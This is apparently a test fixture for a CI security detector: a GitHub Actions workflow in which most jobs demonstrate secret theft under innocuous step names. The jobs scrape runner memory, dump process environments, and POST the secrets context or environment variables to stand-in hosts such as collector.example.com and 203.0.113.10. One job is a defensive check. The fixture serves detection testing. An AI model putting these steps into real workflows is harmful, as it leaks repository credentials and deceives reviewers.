name: Secret exfiltration fixture
# Each job exhibits one FG-028 signal. Endpoints use documentation ranges
# (203.0.113.0/24, 198.51.100.0/24) and example.com; nothing here is a real
# campaign indicator.
on: push
jobs:
  mem-scrape:
    runs-on: ubuntu-latest
    steps:
      - name: Warm build cache
        run: |
          sudo python3 - <<'PY'
          import re
          pid = open('/tmp/worker.pid').read().strip()
          for line in open(f"/proc/{pid}/maps"):
              lo, hi = [int(x, 16) for x in line.split()[0].split('-')]
              with open(f"/proc/{pid}/mem", 'rb') as m:
                  m.seek(lo)
                  m.read(hi - lo)
          PY
  gdb-runner:
    runs-on: ubuntu-latest
    steps:
      - name: Collect diagnostics
        run: sudo gcore -o /tmp/core $(pgrep -f Runner.Worker)
  environ-sweep:
    runs-on: ubuntu-latest
    steps:
      - name: Gather runtime info
        run: |
          for p in /proc/[0-9]*/environ; do tr '\0' '\n' < "$p"; done > /tmp/e.txt
  environ-scrub-assertion:
    runs-on: ubuntu-latest
    steps:
      # Defensive shape: sweep and search in place to prove a key is not
      # visible. Reported at medium for review, not critical.
      - name: Assert sandbox hides deploy key
        run: |
          if for e in /proc/[0-9]*/environ; do tr '\0' '\n' < "$e" 2>/dev/null; done | grep -q '^DEPLOY_KEY='; then
            echo "::error::deploy key visible to sandbox"; exit 1
          fi
  runner-environ-sent:
    runs-on: ubuntu-latest
    steps:
      - name: Report runner state
        run: |
          pid=$(pgrep -f Runner.Worker)
          sudo cat /proc/$pid/environ > /tmp/w.txt
          curl -s --data-binary @/tmp/w.txt https://collector.example.com/w
  secrets-callback:
    runs-on: ubuntu-latest
    steps:
      - name: Restore cache
        env:
          CB_URL: "http://203.0.113.10:8080/collect"
          CB_SECRETS: "${{ toJSON(secrets) }}"
        run: bash .ci-helper.sh
  secrets-curl:
    runs-on: ubuntu-latest
    steps:
      - name: Sync config
        env:
          ALL_SECRETS: ${{ toJSON(secrets) }}
        run: |
          curl -sS -X POST \
            -H 'Content-Type: application/json' \
            --data "$ALL_SECRETS" https://collector.example.com/s
  secrets-script:
    runs-on: ubuntu-latest
    steps:
      - name: Pass runtime
        uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea # v7.0.1
        env:
          BLOB: ${{ toJSON(secrets) }}
        with:
          script: |
            const body = process.env.BLOB;
            await fetch('https://collector.example.com/b', { method: 'POST', body });
  env-curl:
    runs-on: ubuntu-latest
    steps:
      - name: Upload telemetry
        run: env | gzip | base64 -w0 | curl -s -d @- https://collector.example.com/e
  env-grep-secrets:
    runs-on: ubuntu-latest
    steps:
      - name: Upload telemetry
        run: curl -s -d "e=$(printenv | grep -iE 'token|secret')" https://collector.example.com/e
  env-script:
    runs-on: ubuntu-latest
    steps:
      - name: Report
        uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea # v7.0.1
        with:
          script: |
            const data = JSON.stringify(process.env);
            await fetch('https://collector.example.com/p', { method: 'POST', body: data });
  secrets-colocated:
    runs-on: ubuntu-latest
    steps:
      - name: Load secrets and notify
        run: |
          echo '${{ toJSON(secrets) }}' | jq -r 'to_entries[] | .key + "=" + .value' >> "$GITHUB_ENV"
          curl -s -X POST -d '{"text":"deploy started"}' https://hooks.example.com/notify
